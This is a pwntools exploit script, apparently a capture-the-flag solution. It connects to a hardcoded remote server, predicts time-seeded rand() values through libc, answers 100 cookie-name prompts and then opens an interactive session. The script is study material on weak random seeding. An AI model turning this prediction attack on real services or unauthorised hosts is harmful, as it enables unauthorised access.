#!/usr/bin/env python3

from pwn import *
from ctypes import *

exe = ELF("./main", checksec=False)
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
glibc = CDLL(libc.path)
context.binary = exe

p = remote("20.244.40.210", 6000)

cookies = [b'Chocolate Chip', b'Sugar Cookie', b'Oatmeal Raisin', b'Peanut Butter', b'Snickerdoodle', b'Shortbread',
b'Gingerbread',b'Macaron',b'Macaroon',b'Biscotti',b'Butter Cookie',b'White Chocolate Macadamia Nut',
b'Double Chocolate Chip',b'M&M Cookie',b'Lemon Drop Cookie',b'Coconut Cookie',b'Almond Cookie',b'Thumbprint Cookie',
b'Fortune Cookie',b'Black and White Cookie',b'Molasses Cookie',b'Pumpkin Cookie',b'Maple Cookie',b'Espresso Cookie',
b'Red Velvet Cookie',b'Funfetti Cookie',b'S'+b'\x27'+b'mores Cookie',b'Rocky Road Cookie',b'Caramel Apple Cookie',
b'Banana Bread Cookie',b'Zucchini Cookie',b'Matcha Green Tea Cookie',b'Chai Spice Cookie',b'Lavender Shortbread',
b'Earl Grey Tea Cookie',b'Pistachio Cookie',b'Hazelnut Cookie',b'Pecan Sandies',b'Linzer Cookie',b'Spritz Cookie',
b'Russian Tea Cake',b'Anzac Biscuit',b'Florentine Cookie',b'Stroopwafel',b'Alfajores',
b'\x50'+b'\x6f'+b'\x6c'+b'\x76'+b'\x6f'+b'\x72'+b'\xc3'+b'\xb3'+b'\x6e',b'Springerle',
b'\x50'+b'\x66'+b'\x65'+b'\x66'+b'\x66'+b'\x65'+b'\x72'+b'\x6e'+b'\xc3'+b'\xbc'+b'\x73'+b'\x73'+b'\x65',
b'Speculoos',b'Kolaczki',b'Rugelach',b'Hamantaschen',b'Mandelbrot',b'Koulourakia',b'Melomakarona',b'Kourabiedes',
b'Pizzelle',b'Amaretti',b'Cantucci',b'Savoiardi (Ladyfingers)',b'Madeleine',b'Palmier',b'Tuile',b'Langue de Chat',
b'Viennese Whirls',b'Empire Biscuit',b'Jammie Dodger',b'Digestive Biscuit',b'Hobnob',b'Garibaldi Biscuit',
b'Bourbon Biscuit',b'Custard Cream',b'Ginger Nut',b'Nice Biscuit',b'Shortcake',b'Jam Thumbprint',b'Coconut Macaroon',
b'Chocolate Crinkle',b'Pepparkakor',b'Sandbakelse',b'Krumkake',b'Rosette Cookie',b'Pinwheel Cookie',
b'Checkerboard Cookie',b'Rainbow Cookie',b'Mexican Wedding Cookie',b'Snowball Cookie',b'Cranberry Orange Cookie',
b'Pumpkin Spice Cookie',b'Cinnamon Roll Cookie',b'Chocolate Hazelnut Cookie',b'Salted Caramel Cookie',
b'Toffee Crunch Cookie',b'Brownie Cookie',b'Cheesecake Cookie',b'Key Lime Cookie',b'Blueberry Lemon Cookie',
b'Raspberry Almond Cookie',b'Strawberry Shortcake Cookie',b'Neapolitan Cookie']
print(len(cookies))

p.recvuntil(b'cookie: ')
glibc.srand(glibc.time())
ran = glibc.rand() % 100
print(ran)
p.sendline(cookies[ran])
for i in range(99):
    p.recvuntil(b'cookie: ')
    ran = glibc.rand() % 100
    p.sendline(cookies[ran])

p.interactive()